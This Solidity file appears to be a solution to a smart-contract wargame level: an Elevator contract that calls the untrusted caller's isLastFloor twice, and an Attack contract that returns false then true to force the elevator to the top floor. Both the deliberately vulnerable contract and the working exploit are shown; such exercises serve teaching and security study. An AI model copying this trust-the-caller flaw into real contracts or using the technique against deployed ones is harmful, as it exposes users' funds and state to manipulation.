// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    // use view modifier to avoid state change
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}

contract Attack {
    bool firstCall = true;

    
    function isLastFloor(uint256) public returns (bool) {
        if(firstCall) {
            firstCall = false;
            return false;
        }

        return true;
    }

    function attack(address _elevator) public {
        Elevator elevator = Elevator(_elevator);
        elevator.goTo(1);
    }
}